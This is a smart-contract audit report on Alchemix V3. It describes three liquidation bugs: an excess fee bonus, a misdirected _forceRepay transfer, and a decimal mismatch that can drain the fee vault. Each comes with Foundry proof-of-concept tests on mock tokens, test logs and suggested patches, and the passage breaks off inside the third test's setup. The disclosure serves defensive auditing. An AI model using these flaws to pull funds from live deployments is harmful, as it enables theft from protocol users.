# Alchemix V3 

## Findings Summary

| ID | Title | Duplicates |
| - | - | - |
| [H-01](#feebonus-should-be-taken-from-debttoburn-but-it-is-taken-in-addition-to-debttoburn) | feeBonus should be taken from debtToBurn, but it is taken in addition to debtToBurn | 16 | 
| [H-02](#alchemixv3forcerepay-does-not-send-liquidated-yield-tokens-to-transmuter) | AlchemistV3::_forceRepay() does not send liquidated yield tokens to transmuter | 98 |
| [H-03](#feebonus-is-never-adjusted-to-correct-decimals-which-can-result-in-draining-the-fee-vault) | feeBonus is never adjusted to correct decimals which can result in draining the fee vault | 16 |


## feeBonus should be taken from debtToBurn, but it is taken in addition to debtToBurn

## Summary

The `feeBonus`, which is the liquidation fee, is paid out *in addition* to the liquidated collateral, which results in loss of funds for the protocol.

## Vulnerability Detail

```solidity
function calculateLiquidation(
    uint256 collateral,
    uint256 debt,
    uint256 targetCollateralization,
    uint256 alchemistCurrentCollateralization,
    uint256 alchemistMinimumCollateralization,
    uint256 feeBps
) public pure returns (uint256 grossCollateralToSeize, uint256 debtToBurn, uint256 fee) {
    // SNIP

    // 1) fee is taken from surplus = collateral - debt
    uint256 surplus = collateral > debt ? collateral - debt : 0;
    fee = (surplus * feeBps) / BPS;

    // 2) collateral remaining for margin‐restore calc
>   uint256 adjCollat = collateral - fee;
    
    // SNIP
}
```

There are two liquidation fees in the liquidation flow - base fee and surplus fee.

The surplus fee is calculated in `calculateLiquidation()` - The fee is subtracted from collateral.

```solidity
function _liquidate(uint256 accountId) internal returns (uint256 debtAmount, uint256 feeInYield, uint256 feeInUnderlying) {
    // SNIP

    if (collateralizationRatio <= collateralizationLowerBound) {
        uint256 alchemistCurrentCollateralization = normalizeUnderlyingTokensToDebt(_getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / totalDebt;

        (uint256 liquidationAmount, uint256 debtToBurn, uint256 baseFee) = calculateLiquidation(
            collateralInUnderlying, account.debt, minimumCollateralization, alchemistCurrentCollateralization, globalMinimumCollateralization, liquidatorFee
        );

>       uint256 feeBonus = debtToBurn * liquidatorFee / BPS;
        uint256 adjustedLiquidationAmount = convertDebtTokensToYield(liquidationAmount);
>       uint256 adjustedDebtToBurn = convertDebtTokensToYield(debtToBurn);
        debtAmount = adjustedLiquidationAmount;
        feeInYield = convertDebtTokensToYield(baseFee);

        // update user balance (denominated in yield tokens)
        account.collateralBalance = account.collateralBalance > adjustedLiquidationAmount ? account.collateralBalance - adjustedLiquidationAmount : 0;

        // Update users debt (denominated in debt tokens)
        _subDebt(accountId, debtToBurn);

        // send liquidation amount - any fee to the transmuter. the transmuter only accepts yield tokens
        TokenUtils.safeTransfer(yieldToken, transmuter, adjustedDebtToBurn);

        if (feeInYield > 0) {
            // send base fee in yield tokens to liquidator
            TokenUtils.safeTransfer(yieldToken, msg.sender, feeInYield);
        }

        // excess fee will be sent in underlying token to the liquidator.
        // since debt token is 1 : 1 with underyling token
        if (feeBonus > 0) {
            uint256 vaultBalance = IFeeVault(alchemistFeeVault).totalDeposits();
            if (vaultBalance > 0) {
                feeInUnderlying = vaultBalance > feeBonus ? feeBonus : vaultBalance;
                IFeeVault(alchemistFeeVault).withdraw(msg.sender, feeInUnderlying);
            }  
        }
    }
}
```

In `AlchemistV3::_liquidate()`, the `feeBonus` is calculated from `debtToBurn`, but this value is never subtracted from `adjustedDebtToBurn` prior to the token transfers later in the function.

This means that the `feeBonus` will be paid in addition to `debtToBurn`, instead of being paid from `debtToBurn`.

PoC

Set up: Copy and paste the test suite below into `AlchemistV3_8.t.sol`

❯ `forge test --fork-url {} --match-contract AlchemistV3Test_8 -vv`

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.26;

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {TransparentUpgradeableProxy} from "../../lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {SafeCast} from "../libraries/SafeCast.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {AlchemicTokenV3} from "../test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";

import {Whitelist} from "../utils/Whitelist.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TokenAdapterMock} from "./mocks/TokenAdapterMock.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {ITestYieldToken} from "../interfaces/test/ITestYieldToken.sol";
import {InsufficientAllowance} from "../base/Errors.sol";
import {Unauthorized, IllegalArgument, IllegalState, MissingInputData} from "../base/Errors.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";
import {IAlchemistV3Position} from "../interfaces/IAlchemistV3Position.sol";
import {AggregatorV3Interface} from "../../lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {AlchemistTokenVault} from "../AlchemistTokenVault.sol";

contract AlchemistV3Test_8 is Test {
    // ----- [SETUP] Variables for setting up a minimal CDP -----

    // Callable contract variables
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;

    // // Proxy variables
    TransparentUpgradeableProxy proxyAlchemist;
    TransparentUpgradeableProxy proxyTransmuter;

    // // Contract variables
    // CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    AlchemistV3 alchemistLogic;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    Whitelist whitelist;

    // Token addresses
    TestERC20 fakeUnderlyingToken;
    TestYieldToken fakeYieldToken;
    // Total minted debt
    uint256 public minted;

    // Total debt burned
    uint256 public burned;

    // Total tokens sent to transmuter
    uint256 public sentToTransmuter;

    // Parameters for AlchemicTokenV2
    string public _name;
    string public _symbol;
    uint256 public _flashFee;
    address public alOwner;

    mapping(address => bool) users;

    uint256 public constant FIXED_POINT_SCALAR = 1e18;

    uint256 public liquidatorFeeBPS = 300; // in BPS, 3%

    uint256 public minimumCollateralization = uint256(FIXED_POINT_SCALAR * FIXED_POINT_SCALAR) / 9e17;

    // ----- Variables for deposits & withdrawals -----

    // account funds to make deposits/test with
    uint256 accountFunds = 2_000_000_000e6;

    // large amount to test with
    uint256 whaleSupply = 20_000_000_000e6;

    // amount of yield/underlying token to deposit
    uint256 depositAmount = 100_000e6;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDeposit = 1000e6;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDepositOrWithdrawalLoss = FIXED_POINT_SCALAR;

    // random EOA for testing
    address externalUser = address(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420);

    // another random EOA for testing
    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    // another random EOA for testing
    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);

    // another random EOA for testing
    address someWhale = address(0x521aB24368E5Ba8b727e9b8AB967073fF9316961);

    // WETH address
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Mock the price feed call
    address ETH_USD_PRICE_FEED_MAINNET = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;  // @audit never used anywhere

    // Mock the price feed call
    uint256 ETH_USD_UPDATE_TIME_MAINNET = 3600 seconds;

    function setUp() external {
        // test maniplulation for convenience
        address caller = address(0xdead);
        address proxyOwner = address(this);
        vm.assume(caller != address(0));
        vm.assume(proxyOwner != address(0));
        vm.assume(caller != proxyOwner);
        vm.startPrank(caller);

        // Fake tokens

        fakeUnderlyingToken = new TestERC20(100e6, uint8(6));
        fakeYieldToken = new TestYieldToken(address(fakeUnderlyingToken));
        alToken = new AlchemicTokenV3(_name, _symbol, _flashFee);

        ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });

        // Contracts and logic contracts
        alOwner = caller;
        transmuterLogic = new Transmuter(transParams);
        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        // AlchemistV3 proxy
        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: alOwner,
            debtToken: address(alToken),
            underlyingToken: address(fakeUnderlyingToken),
            yieldToken: address(fakeYieldToken),
            blocksPerYear: 2_600_000,
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.05 collateralization
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.1
            tokenAdapter: address(fakeYieldToken),
            transmuter: address(transmuterLogic),
            protocolFee: 0,
            protocolFeeReceiver: address(10),
            liquidatorFee: liquidatorFeeBPS
        });

        bytes memory alchemParams = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), proxyOwner, alchemParams);
        alchemist = AlchemistV3(address(proxyAlchemist));

        // Whitelist alchemist proxy for minting tokens
        alToken.setWhitelist(address(proxyAlchemist), true);

        whitelist.add(address(0xbeef));
        whitelist.add(externalUser);
        whitelist.add(anotherExternalUser);

        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(address(fakeUnderlyingToken), address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));
        vm.stopPrank();

        deal(address(fakeUnderlyingToken), alchemist.alchemistFeeVault(), 10_000e6);

        vm.startPrank(anotherExternalUser);

        SafeERC20.safeApprove(address(fakeUnderlyingToken), address(fakeYieldToken), accountFunds);

        vm.stopPrank();
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(fakeUnderlyingToken), address(fakeYieldToken), accountFunds);
        vm.stopPrank();

        vm.startPrank(someWhale);
        deal(address(fakeYieldToken), someWhale, whaleSupply);
        deal(address(fakeUnderlyingToken), someWhale, whaleSupply);
        SafeERC20.safeApprove(address(fakeUnderlyingToken), address(fakeYieldToken), whaleSupply + 100e18);
        vm.stopPrank();
    }

    function testLiquidateFeeBonusBug() public {
        uint256 amount = 100_000e6; // 100,000 EULER USDC
        deal(address(fakeYieldToken), yetAnotherExternalUser, amount * 2);
        deal(address(fakeYieldToken), anotherExternalUser, amount);

        vm.startPrank(someWhale);
        fakeYieldToken.mint(20_000_000e6, someWhale);
        vm.stopPrank();

        // just ensureing global alchemist collateralization stays above the minimum required for regular liquidations
        // no need to mint anything
        vm.startPrank(yetAnotherExternalUser);
        SafeERC20.safeApprove(address(fakeYieldToken), address(alchemist), amount * 2);
        alchemist.deposit(amount, yetAnotherExternalUser, 0);
        vm.stopPrank();

        // user 1 deposits + takes a loan
        vm.startPrank(anotherExternalUser);
        SafeERC20.safeApprove(address(fakeYieldToken), address(alchemist), amount);
        alchemist.deposit(amount, anotherExternalUser, 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenId1 = AlchemistNFTHelper.getFirstTokenId(anotherExternalUser, address(alchemistNFT));
        alchemist.mint(tokenId1, alchemist.totalValue(tokenId1) * FIXED_POINT_SCALAR / minimumCollateralization, anotherExternalUser);
        vm.stopPrank();

        // modify yield token price via modifying underlying token supply
        uint256 initialVaultSupply = IERC20(address(fakeYieldToken)).totalSupply();
        fakeYieldToken.updateMockTokenSupply(initialVaultSupply);
        // increasing yeild token suppy by 59 bps or 5.9%  while keeping the unederlying supply unchanged
        uint256 modifiedVaultSupply = (initialVaultSupply * 590 / 10_000) + initialVaultSupply;
        fakeYieldToken.updateMockTokenSupply(modifiedVaultSupply);

        // @audit-info ensure that earmarked = 0
        //   _forceRepay() will be skipped - repaidAmountInYield = 0
        //   (debtAmount + 0) will be returned from _liquidate() (first param)
        alchemist.poke(tokenId1);
        (, , uint256 earmarked) = alchemist.getCDP(tokenId1);
        assert(earmarked == 0);

        // @audit-info debtAmount and feeInYield will be paid by AlchemistV3 (in yield token)
        // feeInUnderlying (feeBonus) is paid by the feeVault (in underlying token)
        uint256 preLiquidateAlchemistYieldBalance = IERC20(fakeYieldToken).balanceOf(address(alchemist));
        uint256 preFeeVaultUnderlyingBalance = IERC20(fakeUnderlyingToken).balanceOf(address(alchemistFeeVault));

        vm.startPrank(externalUser);
        (uint256 debtAmount, uint256 feeInYield, uint256 feeInUnderlying) = alchemist.liquidate(tokenId1);

        uint256 postLiquidateAlchemistYieldBalance = IERC20(fakeYieldToken).balanceOf(address(alchemist));
        uint256 postFeeVaultUnderlyingBalance = IERC20(fakeUnderlyingToken).balanceOf(address(alchemistFeeVault));

        console.log("debtAmount: %s", debtAmount);
        console.log("feeInYield: %s", feeInYield);
        console.log("feeInUnderlying: %s\n", feeInUnderlying);

        uint256 alchemistBalanceDiff = preLiquidateAlchemistYieldBalance - postLiquidateAlchemistYieldBalance;
        uint256 feeVaultBalanceDiff = preFeeVaultUnderlyingBalance - postFeeVaultUnderlyingBalance;
        console.log("Amount of yield tokens transferred out of AlchemistV3: %s", alchemistBalanceDiff);
        console.log("Amount of underlying tokens transferred out of feeVault: %s", feeVaultBalanceDiff);

        // @audit-info feeInYield is taken from debtToBurn in calculateLiquidation()
        vm.assertApproxEqAbs(debtAmount, alchemistBalanceDiff, 10);
        
        // @audit-info ensure that actual amount dispensed > expected amount 
        uint256 expectedDebtTokensWithdrawn = debtAmount;
        uint256 actualDebtTokensWithdrawn = alchemistBalanceDiff + alchemist.convertUnderlyingTokensToYield(feeVaultBalanceDiff);
        assert(actualDebtTokensWithdrawn > expectedDebtTokensWithdrawn);

        // @audit-info how much fee was taken in excess / addition to debtToBurn
        uint256 excessFees = actualDebtTokensWithdrawn - expectedDebtTokensWithdrawn;
        console.log("Excess fee that was paid (in yield tokens): %s", excessFees);
    }
}
```

```solidity
Ran 1 test for src/test/AlchemistV3_8.t.sol:AlchemistV3Test_8
[PASS] testLiquidateFeeBonusBug() (gas: 1240052)
Logs:
  debtAmount: 54507061941
  feeInYield: 140699807
  feeInUnderlying: 10000000000

  Amount of yield tokens transferred out of AlchemistV3: 54507061940
  Amount of underlying tokens transferred out of feeVault: 10000000000
  Excess fee that was paid (in yield tokens): 10590000708

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.72s (107.26ms CPU time)

Ran 1 test suite in 2.07s (1.72s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

Loss of funds for the protocol - Fees should always be taken from the liquidated collateral.

## Recommendation

```solidity
function _liquidate(uint256 accountId) internal returns (uint256 debtAmount, uint256 feeInYield, uint256 feeInUnderlying) {
        // SNIP

        // Recalculate ratio after any repayment to determine if further liquidation is needed
        collateralInUnderlying = totalValue(accountId);
        collateralizationRatio = collateralInUnderlying * FIXED_POINT_SCALAR / account.debt;

        if (collateralizationRatio <= collateralizationLowerBound) {
            uint256 alchemistCurrentCollateralization = normalizeUnderlyingTokensToDebt(_getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / totalDebt;

            (uint256 liquidationAmount, uint256 debtToBurn, uint256 baseFee) = calculateLiquidation(
                collateralInUnderlying, account.debt, minimumCollateralization, alchemistCurrentCollateralization, globalMinimumCollateralization, liquidatorFee
            );

            uint256 feeBonus = debtToBurn * liquidatorFee / BPS;
            uint256 adjustedLiquidationAmount = convertDebtTokensToYield(liquidationAmount);
-           uint256 adjustedDebtToBurn = convertDebtTokensToYield(debtToBurn);
+           uint256 adjustedDebtToBurn = convertDebtTokensToYield(debtToBurn) - convertDebtTokensToYield(feeBonus);
            debtAmount = adjustedLiquidationAmount;
            feeInYield = convertDebtTokensToYield(baseFee);

            // SNIP
        }

        return (debtAmount + repaidAmountInYield, feeInYield, feeInUnderlying);
    }
```

## AlchemistV3::_forceRepay() does not send liquidated yield tokens to transmuter

## Summary

`AlchemistV3::_forceRepay()` calls `safeTransfer()` with destination as `address(this)`, which results in a no-op.

The destination should have been the `Transmuter` contract as indicated in the comments.

## Vulnerability Detail

```solidity
function _forceRepay(uint256 accountId, uint256 amount) internal returns (uint256) {
    // SNIP

    // Transfer the repaid tokens from the account to the transmuter.
>   TokenUtils.safeTransfer(yieldToken, address(this), creditToYield);
    return creditToYield;
}
```

In `AlchemistV3::_forceRepay()`, the comments state that any liquidated earmarked tokens are sent to the `Transmuter`.

The tokens intended to fund the `Transmuter` are left in the `AlchemistV3` contract any time `_forceRepay()` is called.

PoC

Copy the test case below into `AlchemistV3.t.sol`

Run with: `forge test --fork-url {} --match-test testForceRepayMissingTransfer -vv`

```solidity
function testForceRepayMissingTransfer() external {
    uint256 amount = 100_000e6; // 100,000 EULER USDC

    vm.startPrank(someWhale);
    fakeYieldToken.mint(20_000_000e6, someWhale);
    vm.stopPrank();

    // just ensureing global alchemist collateralization stays above the minimum required for regular liquidations
    // no need to mint anything
    vm.startPrank(yetAnotherExternalUser);
    SafeERC20.safeApprove(address(fakeYieldToken), address(alchemist), amount * 2);
    alchemist.deposit(amount, yetAnotherExternalUser, 0);
    vm.stopPrank();

    // user 1 deposits + takes a loan
    vm.startPrank(address(0xbeef));
    SafeERC20.safeApprove(address(fakeYieldToken), address(alchemist), amount);
    alchemist.deposit(amount, address(0xbeef), 0);
    // a single position nft would have been minted to 0xbeef
    uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
    alchemist.mint(tokenIdFor0xBeef, alchemist.totalValue(tokenIdFor0xBeef) * FIXED_POINT_SCALAR / minimumCollateralization, address(0xbeef));
    vm.stopPrank();

    // modify yield token price via modifying underlying token supply
    (uint256 prevCollateral, uint256 prevDebt,) = alchemist.getCDP(tokenIdFor0xBeef);
    uint256 initialVaultSupply = IERC20(address(fakeYieldToken)).totalSupply();
    fakeYieldToken.updateMockTokenSupply(initialVaultSupply);
    // increasing yeild token suppy by 59 bps or 5.9%  while keeping the unederlying supply unchanged
    uint256 modifiedVaultSupply = (initialVaultSupply * 590 / 10_000) + initialVaultSupply;
    fakeYieldToken.updateMockTokenSupply(modifiedVaultSupply);

    vm.startPrank(address(0xdad));
    deal(address(alToken), address(0xdad), 5000e18);
    SafeERC20.safeApprove(address(alToken), address(transmuterLogic), 5000e18);
    transmuterLogic.createRedemption(5000e18);
    vm.stopPrank();

    vm.roll(block.number + 10);    // time elapse

    // @audit calculation for liquidated earmarked debt in _forceRepay()
    (, uint256 debt, uint256 earmarked) = alchemist.getCDP(tokenIdFor0xBeef);
    uint256 creditToYield = alchemist.convertDebtTokensToYield(earmarked);
    creditToYield = alchemist.convertDebtTokensToYield(alchemist.convertYieldTokensToDebt(creditToYield));

    uint256 preLiquidateTransmuterBalance = IERC20(fakeYieldToken).balanceOf(address(transmuter));

    vm.startPrank(externalUser);        
    alchemist.liquidate(tokenIdFor0xBeef);

    uint256 postLiquidateTransmuterBalance = IERC20(fakeYieldToken).balanceOf(address(transmuter));

    console.log("Pre-Liquidate Transmuter Balance: %s", preLiquidateTransmuterBalance);
    console.log("Post-Liquidate Transmuter Balance: %s", postLiquidateTransmuterBalance);
    console.log("Expected creditToYield: %s", creditToYield);
}
```

```solidity
Ran 1 test for src/test/AlchemistV3.t.sol:AlchemistV3Test
[PASS] testForceRepayMissingTransfer() (gas: 2093830)
Logs:
  Pre-Liquidate Transmuter Balance: 0
  Post-Liquidate Transmuter Balance: 0
  Expected creditToYield: 10072

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.37s (58.69ms CPU time)

Ran 1 test suite in 1.68s (1.37s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

## Impact

Any earmarked debt which is liquidated in `_forceRepay()` is never sent to the `Transmuter` contract as intended.

## Recommendation

```solidity
function _forceRepay(uint256 accountId, uint256 amount) internal returns (uint256) {
    // SNIP

    // Transfer the repaid tokens from the account to the transmuter.
-   TokenUtils.safeTransfer(yieldToken, address(this), creditToYield);
+   TokenUtils.safeTransfer(yieldToken, transmuter, creditToYield);

    return creditToYield;
}
```

## feeBonus is never adjusted to correct decimals which can result in draining the fee vault

## Summary

`feeBonus` calculation in `_liquidate()` is missing conversion from debt token decimals to underlying token decimals prior to transferring to liquidator.

## Vulnerability Detail

```solidity
function _liquidate(uint256 accountId) internal returns (uint256 debtAmount, uint256 feeInYield, uint256 feeInUnderlying) {
        // SNIP

        // Recalculate ratio after any repayment to determine if further liquidation is needed
        collateralInUnderlying = totalValue(accountId);
        collateralizationRatio = collateralInUnderlying * FIXED_POINT_SCALAR / account.debt;

        if (collateralizationRatio <= collateralizationLowerBound) {
            uint256 alchemistCurrentCollateralization = normalizeUnderlyingTokensToDebt(_getTotalUnderlyingValue()) * FIXED_POINT_SCALAR / totalDebt;

            (uint256 liquidationAmount, uint256 debtToBurn, uint256 baseFee) = calculateLiquidation(
                collateralInUnderlying, account.debt, minimumCollateralization, alchemistCurrentCollateralization, globalMinimumCollateralization, liquidatorFee
            );

>           uint256 feeBonus = debtToBurn * liquidatorFee / BPS;
            uint256 adjustedLiquidationAmount = convertDebtTokensToYield(liquidationAmount);
            uint256 adjustedDebtToBurn = convertDebtTokensToYield(debtToBurn);
            debtAmount = adjustedLiquidationAmount;
            feeInYield = convertDebtTokensToYield(baseFee);
            
            // SNIP
        
            // excess fee will be sent in underlying token to the liquidator.
            // since debt token is 1 : 1 with underyling token
            if (feeBonus > 0) {
                uint256 vaultBalance = IFeeVault(alchemistFeeVault).totalDeposits();
                if (vaultBalance > 0) {
                    feeInUnderlying = vaultBalance > feeBonus ? feeBonus : vaultBalance;
 >                  IFeeVault(alchemistFeeVault).withdraw(msg.sender, feeInUnderlying);
                }
            }
        }

        return (debtAmount + repaidAmountInYield, feeInYield, feeInUnderlying);
}
```

In `AlchemistV3::_liquidate()`, `feeBonus` is in debt tokens decimals (i.e. - 18 decimals for `alUSD`)

The `feeBonus` is withdrawn from the `feeVault` without calling `convertDebtTokensToYield()` like `debtToBurn`, `liquidationAmount`, or `baseFee`.

For an `AlchemistV3` deployment with Euler USDC as yield token, the `feeVault` would hold USDC.

Since the debt tokens are in 18 decimals and USDC is in 6 decimals, there may be high likelihood that the entire vault balance is siphoned off by a liquidator.

PoC

Set up: copy + paste the test suite below into `AlchemistV3Test_5.t.sol`

❯ `forge test --fork-url {} --match-contract AlchemistV3Test_5 -vv`

```solidity
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.26;

import {IERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import {TransparentUpgradeableProxy} from "../../lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {SafeCast} from "../libraries/SafeCast.sol";
import {Test} from "../../lib/forge-std/src/Test.sol";
import {SafeERC20} from "../libraries/SafeERC20.sol";
import {console} from "../../lib/forge-std/src/console.sol";
import {AlchemistV3} from "../AlchemistV3.sol";
import {AlchemicTokenV3} from "../test/mocks/AlchemicTokenV3.sol";
import {Transmuter} from "../Transmuter.sol";
import {AlchemistV3Position} from "../AlchemistV3Position.sol";

import {Whitelist} from "../utils/Whitelist.sol";
import {TestERC20} from "./mocks/TestERC20.sol";
import {TestYieldToken} from "./mocks/TestYieldToken.sol";
import {TokenAdapterMock} from "./mocks/TokenAdapterMock.sol";
import {IAlchemistV3, IAlchemistV3Errors, AlchemistInitializationParams} from "../interfaces/IAlchemistV3.sol";
import {ITransmuter} from "../interfaces/ITransmuter.sol";
import {ITestYieldToken} from "../interfaces/test/ITestYieldToken.sol";
import {InsufficientAllowance} from "../base/Errors.sol";
import {Unauthorized, IllegalArgument, IllegalState, MissingInputData} from "../base/Errors.sol";
import {AlchemistNFTHelper} from "./libraries/AlchemistNFTHelper.sol";
import {IAlchemistV3Position} from "../interfaces/IAlchemistV3Position.sol";
import {AggregatorV3Interface} from "../../lib/chainlink-brownie-contracts/contracts/src/v0.8/shared/interfaces/AggregatorV3Interface.sol";
import {TokenUtils} from "../libraries/TokenUtils.sol";
import {AlchemistTokenVault} from "../AlchemistTokenVault.sol";

contract AlchemistV3Test_5 is Test {
    // ----- [SETUP] Variables for setting up a minimal CDP -----

    // Callable contract variables
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;

    // // Proxy variables
    TransparentUpgradeableProxy proxyAlchemist;
    TransparentUpgradeableProxy proxyTransmuter;

    // // Contract variables
    // CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    AlchemistV3 alchemistLogic;
    Transmuter transmuterLogic;
    AlchemicTokenV3 alToken;
    Whitelist whitelist;

    // Token addresses
    TestERC20 fakeUnderlyingToken;
    TestYieldToken fakeYieldToken;
    // Total minted debt
    uint256 public minted;

    // Total debt burned
    uint256 public burned;

    // Total tokens sent to transmuter
    uint256 public sentToTransmuter;

    // Parameters for AlchemicTokenV2
    string public _name;
    string public _symbol;
    uint256 public _flashFee;
    address public alOwner;

    mapping(address => bool) users;

    uint256 public constant FIXED_POINT_SCALAR = 1e18;

    uint256 public liquidatorFeeBPS = 300; // in BPS, 3%

    uint256 public minimumCollateralization = uint256(FIXED_POINT_SCALAR * FIXED_POINT_SCALAR) / 9e17;

    // ----- Variables for deposits & withdrawals -----

    // account funds to make deposits/test with
    uint256 accountFunds = 2_000_000_000e6;

    // large amount to test with
    uint256 whaleSupply = 20_000_000_000e6;

    // amount of yield/underlying token to deposit
    uint256 depositAmount = 100_000e6;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDeposit = 1000e6;

    // minimum amount of yield/underlying token to deposit
    uint256 minimumDepositOrWithdrawalLoss = FIXED_POINT_SCALAR;

    // random EOA for testing
    address externalUser = address(0x69E8cE9bFc01AA33cD2d02Ed91c72224481Fa420);

    // another random EOA for testing
    address anotherExternalUser = address(0x420Ab24368E5bA8b727E9B8aB967073Ff9316969);

    // another random EOA for testing
    address yetAnotherExternalUser = address(0x520aB24368e5Ba8B727E9b8aB967073Ff9316961);

    // another random EOA for testing
    address someWhale = address(0x521aB24368E5Ba8b727e9b8AB967073fF9316961);

    // WETH address
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    // Mock the price feed call
    address ETH_USD_PRICE_FEED_MAINNET = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;  // @audit never used anywhere

    // Mock the price feed call
    uint256 ETH_USD_UPDATE_TIME_MAINNET = 3600 seconds;

    function setUp() external {
        // test maniplulation for convenience
        address caller = address(0xdead);
        address proxyOwner = address(this);
        vm.assume(caller != address(0));
        vm.assume(proxyOwner != address(0));
        vm.assume(caller != proxyOwner);
        vm.startPrank(caller);

        // Fake tokens

        fakeUnderlyingToken = new TestERC20(100e6, uint8(6));
        fakeYieldToken = new TestYieldToken(address(fakeUnderlyingToken));
        alToken = new AlchemicTokenV3(_name, _symbol, _flashFee);

        ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken: address(alToken),
            feeReceiver: address(this),
            timeToTransmute: 5_256_000,
            transmutationFee: 10,
            exitFee: 20,
            graphSize: 52_560_000
        });

        // Contracts and logic contracts
        alOwner = caller;
        transmuterLogic = new Transmuter(transParams);
        alchemistLogic = new AlchemistV3();
        whitelist = new Whitelist();

        // AlchemistV3 proxy
        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin: alOwner,
            debtToken: address(alToken),
            underlyingToken: address(fakeUnderlyingToken),
            yieldToken: address(fakeYieldToken),
            blocksPerYear: 2_600_000,
            depositCap: type(uint256).max,
            minimumCollateralization: minimumCollateralization,
            collateralizationLowerBound: 1_052_631_578_950_000_000, // 1.05 collateralization
            globalMinimumCollateralization: 1_111_111_111_111_111_111, // 1.1
            tokenAdapter: address(fakeYieldToken),
            transmuter: address(transmuterLogic),
            protocolFee: 0,
            protocolFeeReceiver: address(10),
            liquidatorFee: liquidatorFeeBPS
        });

        bytes memory alchemParams = abi.encodeWithSelector(AlchemistV3.initialize.selector, params);
        proxyAlchemist = new TransparentUpgradeableProxy(address(alchemistLogic), proxyOwner, alchemParams);
        alchemist = AlchemistV3(address(proxyAlchemist));

        // Whitelist alchemist proxy for minting tokens
        alToken.setWhitelist(address(proxyAlchemist), true);

        whitelist.add(address(0xbeef));
        whitelist.add(externalUser);
        whitelist.add(anotherExternalUser);

        transmuterLogic.setAlchemist(address(alchemist));
        transmuterLogic.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));

        alchemistFeeVault = new AlchemistTokenVault(address(fakeUnderlyingToken), address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));
        vm.stopPrank();

        /*// Add funds to test accounts
        deal(address(fakeYieldToken), address(0xbeef), accountFunds);
        deal(address(fakeYieldToken), address(0xdad), accountFunds);
        deal(address(fakeYieldToken), externalUser, accountFunds);
